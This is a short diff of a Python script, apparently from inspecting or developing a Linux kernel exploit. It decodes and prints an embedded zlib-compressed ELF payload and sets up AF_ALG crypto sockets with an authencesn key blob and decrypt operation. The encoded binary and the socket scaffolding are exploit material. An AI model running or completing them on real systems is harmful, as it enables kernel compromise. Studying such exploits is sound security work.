@@ -9,7 +9,7 @@ def dec(_bytes):
 #decompress base64-encoded payload and convert to bytes
 bytesDec = zlib.decompress(dec("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
 
-#print(bytesDec)
+print(bytesDec)
 
 '''
 Output:
@@ -19,9 +19,11 @@ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00>\x00\x01\x00\x
 #test socket outputs
 ALFSock = socket.socket(38, 5, 0)
 testSock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
-#print(ALFSock)
-#print(testSock) #test numerical inputs
+print(ALFSock)
+print(testSock) #test numerical inputs
 
-#print(dec('0800010000000010'+'0'*64))
+#view key for authencesn
+print(dec('0800010000000010'+'0'*64))
 
+#test payload options
 print(socket.ALG_OP_DECRYPT)
